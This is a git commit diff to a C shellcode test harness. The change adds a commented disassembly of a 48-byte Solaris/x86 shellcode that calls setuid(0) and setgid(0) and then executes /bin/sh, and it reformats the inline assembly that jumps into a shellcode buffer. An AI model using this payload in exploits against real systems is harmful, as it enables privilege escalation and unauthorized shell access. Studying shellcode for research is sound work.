701006ce64ee7208dfedf341a1917a703b70d883
plvhx <gandung@slackerc0de.us>
2022-06-19 14:28:22 +0700

    Implementing trivial shadow stack :)

--- 6-i386.c
+++ 6-i386.c
@@ -14,6 +14,47 @@
 
 #include "regs/state.h"
 
+/*
+ * SunOS (Solaris) / x86 setuid(0) + setgid(0) +
+ * execve("/bin/sh", {"/bin/sh", NULL}, NULL) 48 bytes shellcode
+ *
+ * Paulus Gandung Prakosa <gandung@lists.infradead.org>
+ *
+ * Tested on: SunOS solaris-vagrant 5.11 11.4.0.15.0 i86pc i386 i86pc
+ *
+ * Disassembly of section .text:
+ *
+ * 08050428 <_start>:
+ * 8050428:       33 f6                   xor    %esi,%esi
+ * 805042a:       56                      push   %esi
+ * 805042b:       56                      push   %esi
+ * 805042c:       33 c0                   xor    %eax,%eax
+ * 805042e:       b0 17                   mov    $0x17,%al
+ * 8050430:       50                      push   %eax
+ * 8050431:       cd 91                   int    $0x91
+ * 8050433:       56                      push   %esi
+ * 8050434:       56                      push   %esi
+ * 8050435:       33 c0                   xor    %eax,%eax
+ * 8050437:       b0 2e                   mov    $0x2e,%al
+ * 8050439:       50                      push   %eax
+ * 805043a:       cd 91                   int    $0x91
+ * 805043c:       56                      push   %esi
+ * 805043d:       68 6e 2f 73 68          push   $0x68732f6e
+ * 8050442:       68 2f 2f 62 69          push   $0x69622f2f
+ * 8050447:       8b dc                   mov    %esp,%ebx
+ * 8050449:       56                      push   %esi
+ * 805044a:       53                      push   %ebx
+ * 805044b:       8b cc                   mov    %esp,%ecx
+ * 805044d:       56                      push   %esi
+ * 805044e:       56                      push   %esi
+ * 805044f:       51                      push   %ecx
+ * 8050450:       53                      push   %ebx
+ * 8050451:       33 c0                   xor    %eax,%eax
+ * 8050453:       b0 3b                   mov    $0x3b,%al
+ * 8050455:       50                      push   %eax
+ * 8050456:       cd 91                   int    $0x91
+ */
+
 #ifndef unused
 #define unused(x) ((void)(x))
 #endif
@@ -93,12 +134,10 @@ int main(int argc, char **argv) {
                          : "r"((unsigned long)shadow_stack));
 
     printf("[*] Executing the shellcode and restoring stack..\n");
-    __asm__ __volatile__(
-      "call *%%eax\n"
-      "xchg %%edi, %%esp\n"
-      :
-      : "a"(pcall)
-    );
+    __asm__ __volatile__("call *%%eax\n"
+                         "xchg %%edi, %%esp\n"
+                         :
+                         : "a"(pcall));
   } else {
     waitpid(-1, &wstatus, 0);
   }
